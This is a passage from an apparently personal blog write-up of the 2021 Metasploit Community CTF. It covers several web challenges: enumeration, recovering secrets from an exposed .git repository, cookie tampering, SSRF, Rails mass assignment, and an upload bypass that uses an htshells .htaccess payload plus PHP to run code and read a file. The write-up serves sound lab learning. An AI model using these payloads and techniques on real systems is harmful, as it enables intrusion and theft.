```bash
$ ssh -L 8082:172.17.26.149:80 kali@18.215.161.123 -i metasploit_ctf_kali_ssh_key.pem
```

This command open a tunnel from my machine to the jump box (18.215.161.123). Then requests I make on port 8082 will go through the jump box and be sent to the target machine (172.17.26.149) on port 80. For the other challenges, I could just change the target port. 

neoh made [an  image that explains the command](https://mikelizotte.ca/2021/12/04/metasploit-community-ctf-writeup/).

![SSH Tunnel](/assets/images/2021/12/MetasploitCTF/sshTunnel.png "SSH Tunnel")

This way, I could just open by browser to http://localhost:8082/ and view the site on port 80.

![Port 80](/assets/images/2021/12/MetasploitCTF/Port80.png "Port 80")

## Port 443
Next I decided to go to the next port found by nmap: 443. I started by reopening the SSH tunnel on the new targeted port.

```bash
$ ssh -L 8082:172.17.26.149:443 kali@18.215.161.123 -i metasploit_ctf_kali_ssh_key.pem
```

I refreshed my browser and this time I had a page that was still under construction. 

![Port 443](/assets/images/2021/12/MetasploitCTF/Port443.png "Port 443")

I looked at the page source, the cookies and the headers in Burp, but I did not find anything there. Nothing in robots.txt either. 

So I fired up GoBuster, and it did find something of interest. 

```bash
$ gobuster dir -e -u http://localhost:8082 -t30 -w /usr/share/dirb/wordlists/common.txt  -xjs,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8082
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/12/04 13:49:58 Starting gobuster in directory enumeration mode
===============================================================
http://localhost:8082/.hta                 (Status: 403) [Size: 276]
http://localhost:8082/.htaccess            (Status: 403) [Size: 276]
http://localhost:8082/.hta.js              (Status: 403) [Size: 276]
http://localhost:8082/.htaccess.js         (Status: 403) [Size: 276]
http://localhost:8082/.hta.txt             (Status: 403) [Size: 276]
http://localhost:8082/.htaccess.txt        (Status: 403) [Size: 276]
http://localhost:8082/.hta.php             (Status: 403) [Size: 276]
http://localhost:8082/.htaccess.php        (Status: 403) [Size: 276]
http://localhost:8082/.git/HEAD            (Status: 200) [Size: 23] 
http://localhost:8082/.htpasswd.txt        (Status: 403) [Size: 276]
http://localhost:8082/.htpasswd.php        (Status: 403) [Size: 276]
http://localhost:8082/.htpasswd            (Status: 403) [Size: 276]
http://localhost:8082/.htpasswd.js         (Status: 403) [Size: 276]
http://localhost:8082/index.html           (Status: 200) [Size: 26] 
http://localhost:8082/server-status        (Status: 403) [Size: 276]
                                                                    
===============================================================
2021/12/04 13:50:20 Finished
===============================================================
```

It looks like the site developers have deployed their git repository with the site. I had used a tool to extract that in the past. So I did some searches and found [git-dumper](https://github.com/arthaud/git-dumper). 

```bash
$ git-dumper http://localhost:8082/.git/ temp                                                            
[-] Testing http://localhost:8082/.git/HEAD [200]                                                                    
[-] Testing http://localhost:8082/.git/ [403]                                                                        
[-] Fetching common files                                
[-] Fetching http://localhost:8082/.gitignore [404]                                                                  
[-] http://localhost:8082/.gitignore responded with status code 404
[-] Fetching http://localhost:8082/.git/COMMIT_EDITMSG [200]
[-] Fetching http://localhost:8082/.git/description [200]
[-] Fetching http://localhost:8082/.git/hooks/post-commit.sample [404]                         
[-] http://localhost:8082/.git/hooks/post-commit.sample responded with status code 404         

...

[-] Fetching http://localhost:8082/.git/objects/fa/efc0407d461914a05d2abf2cfae62230ea761a [200]
[-] Fetching http://localhost:8082/.git/objects/1e/4988fd28fdfb4116f7203451e6cf1b6c51ea43 [200]
[-] Running git checkout .

$ cd temp/

$ ls -la
total 16
drwxr-xr-x  3 ehogue ehogue 4096 Dec  4 13:57 .
drwxr-xr-x 44 ehogue ehogue 4096 Dec  4 13:57 ..
drwxr-xr-x  7 ehogue ehogue 4096 Dec  4 13:57 .git
-rw-r--r--  1 ehogue ehogue   27 Dec  4 13:57 index.html

$ git status
On branch master
nothing to commit, working tree clean

$ cat index.html 
Website under development
```

I had the git repository, but the master branch had only the index file. I then looked at the history.

```bash
$ git log
commit 687168d567086a87eccd0621eec3f90e331ee5a7 (HEAD -> master)
Author: developer <developer@127.0.0.1>
Date:   Tue Nov 16 16:55:27 2021 +0000

    More enthusiasm

commit b429a1087c6723fa1aff5a36e6c5055e775cb923
Author: developer <developer@127.0.0.1>
Date:   Tue Nov 16 16:55:27 2021 +0000

    Cleanup

commit 61fffcea82d8ed62623d34d956d69602e93d8747
Author: developer <developer@127.0.0.1>
Date:   Tue Nov 16 16:55:27 2021 +0000

    Initial commit
```

There is a Cleanup commit in there. That looks like someone might have removed some secrets from the repo. I checked out the previous commit to look at what was in there. 

```bash
$ git checkout 61fffcea82d8ed62623d34d956d69602e93d8747
Note: switching to '61fffcea82d8ed62623d34d956d69602e93d8747'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 61fffce Initial commit

$ ls -la
total 20
drwxr-xr-x  3 ehogue ehogue 4096 Dec  4 14:05 .
drwxr-xr-x 44 ehogue ehogue 4096 Dec  4 13:57 ..
-rw-r--r--  1 ehogue ehogue   90 Dec  4 14:05 .env
drwxr-xr-x  7 ehogue ehogue 4096 Dec  4 14:05 .git
-rw-r--r--  1 ehogue ehogue   26 Dec  4 14:05 index.html

$ cat .env 
username=root
password=password123
flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
```

The flag location was in a .env file in the first commit of the repo. I opened that page in a browser. 

![Flag 2](/assets/images/2021/12/MetasploitCTF/Flag2.png "Flag 2")

I save the image locally, then used md5sum to get the flag for the 2 of spades.

```bash
$ md5sum ~/Downloads/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png 
e908c9867ab88f1ee926b588b9b47be4  /home/ehogue/Downloads/3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
```

## Port 8080

I next move on to port 8080. I opened the tunnel to the correct port and looked at the site in my browser. 

![Port 8082](/assets/images/2021/12/MetasploitCTF/Port8082.png "Port 8082")

I wonder if all those cookies are an hint? I looked at my cookies. At first I only had one called `visited-main-page` and set to `true`. 

I tried clicking on the Admin link. It gave me this message:
> Unauthenticated users cannot access this page.

So I clicked on the Sign Up link and created an account.

![Create Account](/assets/images/2021/12/MetasploitCTF/CreateAccount.png "Create Account")

I went back to the Admin page and got the same message as before. So I used the Sign In link to connect to the page. 

![Sign In](/assets/images/2021/12/MetasploitCTF/SignIn.png "Sign In")

When I went back to the Admin page I had a new message. 
> You don't have permissions to view this page.

And a few new cookies. 

![Cookies](/assets/images/2021/12/MetasploitCTF/Cookies.png "Cookies")

I changed the `admin` cookie from `false` to `true` and refreshed the page. This gave me the Nine of Diamonds images. 

![Nine of Diamonds](/assets/images/2021/12/MetasploitCTF/NineOfDiamonds.png "Nine of Diamonds")

## Port 20011

After that I spent a lots of time on challenges I did not solve. Until I got to port 20011. I opened the usual SSH tunnel, and then looked at the site in a browser.

![Port 20011](/assets/images/2021/12/MetasploitCTF/Port20011.png "Port 20011")

The site is a list of photo galleries. 

![Sarah's Gallery](/assets/images/2021/12/MetasploitCTF/SarahsGallery.png "Sarah's Gallery")

However, Jonh's gallery was not accessible. 

![John's Gallery](/assets/images/2021/12/MetasploitCTF/JohnsGallery.png "John's Gallery")

I also tried accessing the Admin page, but I got a 401.

![401](/assets/images/2021/12/MetasploitCTF/401.png "401")

I next tried using the form on the bottom of the page that allowed to view galleries that are not added to the home page. 

I first tried to use it to load John's gallery, but I got the same result as before. 

http://localhost:8082/gallery?galleryUrl=http%3A%2F%2Flocalhost%3A20011%2Fgallery%2FJohn

Next I tried loading the Admin page this way. And there I got something different.

http://localhost:8082/gallery?galleryUrl=http%3A%2F%2Flocalhost%3A20011%2Fadmin


![Admin Page](/assets/images/2021/12/MetasploitCTF/AdminPage.png "Admin Page")

I made Jonh's gallery public and reloaded it. This gave me the Ace of Hearts flag. 

![Ace of Hearts](/assets/images/2021/12/MetasploitCTF/AceOfHearts.png "Ace of Hearts")

## Port 20055

The next flag I found was on port 20055. I opened the SSH tunnel and looked at the web site on that port.

![Port 20055](/assets/images/2021/12/MetasploitCTF/Port20055.png "Port 20055")

This one requires to exploit a file upload vulnerability. The code prevent uploading any executable file. But it does not prevent uploading a .htaccess file. So I could upload one and change the way Apache handle some files. I used one of the payload from [htshells](https://github.com/wireghoul/htshells) and modified it to make a new extension executable by PHP. The file also made .htaccess accessible in the upload folder.

```
# <!--  Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
    Require all granted
    Order allow,deny
    Allow from all
</Files>

# Make .vuln file executable as PHP
AddType application/x-httpd-php .vuln
```

I uploaded the file. 

![.htaccess Uploaded](/assets/images/2021/12/MetasploitCTF/htaccessUploaded.png ".htacess Uploaded")

I clicked on the link, and sure enough, the .htaccess was displayed. So I knew that the bypass worked. 

Next I wrote some PHP in a file called `test.vuln`, and uploaded it.

```php
<?php
echo 'IT WORKED';
```

When I accessed it, the file was executed and displayed my message. 

![It Worked](/assets/images/2021/12/MetasploitCTF/testVuln.png "It Worked")

I knew I could execute any PHP I wanted on the server. So I modified my test file to read the flag file and echo it back to me. 

```php
<?php
echo file_get_contents('/flag.png');
```

I uploaded that file, then used curl to download the flag image and get it's MD5 checksum. 

```bash
$ curl http://localhost:8082/file_uploads/test.vuln -o flag.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  129k    0  129k    0     0   477k      0 --:--:-- --:--:-- --:--:--  479k

$ md5sum flag.png
270d4a0a9abc1c048102ff8b91f10927  flag.png
```
![Nine of Spades](/assets/images/2021/12/MetasploitCTF/NineOfSpades.png "Nine of Spades")

## Port 10010

On this port, we have a simple site. 


![Port 10010](/assets/images/2021/12/MetasploitCTF/Port10010.png "Port 10010")

I created a user and looked at the logged in pages. 

![Admin Panel](/assets/images/2021/12/MetasploitCTF/AdminPanel.png "Admin Panel")

The Main page just redirected to the Account page. I tried changing the account ID in the URL, but that didn't work. I was just redirected to my account page. 

I ran GoBuster, and it found an admin page. But I could not access it. 

At this point, I tried lots of thing. The site was a Rails site, I tried to decrypt the session cookie, but failed. I also realized that we could create multiple accounts with the same name. So I thought that I might be able to create a user called admin or administrator and use it to bypass the check on the account page. But that did not work either. 

The account page, contained a json dump of the account object. 

```js
<script>
    var current_account = {"id":6,"username":"test","password":"test","role":"user","created_at":"2021-12-05T20:04:44.243Z","updated_at":"2021-12-05T20:04:44.243Z"};
</script>
```

It took me a while, but eventually I remember that old version of Rails had a [mass assignment vulnerability](https://www.acunetix.com/vulnerabilities/web/rails-mass-assignment/). Someone had used it to create [an issue in the future on Github](https://github.com/rails/rails/issues/5239). It looks like the date got fixed, but initially, the issue was dated in 3012. 

I decided to give it a try. I logout and created a new user, this time using Burp to intercept the request and add a role attribute to the posted data. 

![Mass Assignment](/assets/images/2021/12/MetasploitCTF/MassAssignment.png "MassAssignment")

I looked at my profile page, and my role was now admin instead of user. 

```js
<script> 
var current_account = {"id":7,"username":"writeup","password":"writeup","role":"admin","created_at":"2021-12-05T20:24:13.508Z","updated_at":"2021-12-05T20:24:13.508Z"};</script>
```

I tried going to the admin page with that user and it gave me the flag. 

![Four of Diamonds](/assets/images/2021/12/MetasploitCTF/FourOfDiamonds.png "Four of Diamonds")

## The End

After that flag that was it for me. I really enjoyed the CTF. My team was great, we shared a lot of knowledge together. 

Also doing the CTF over a weekend, without really trying to compete was nice. I just worked on it when I had time between my normal weekend activities. 
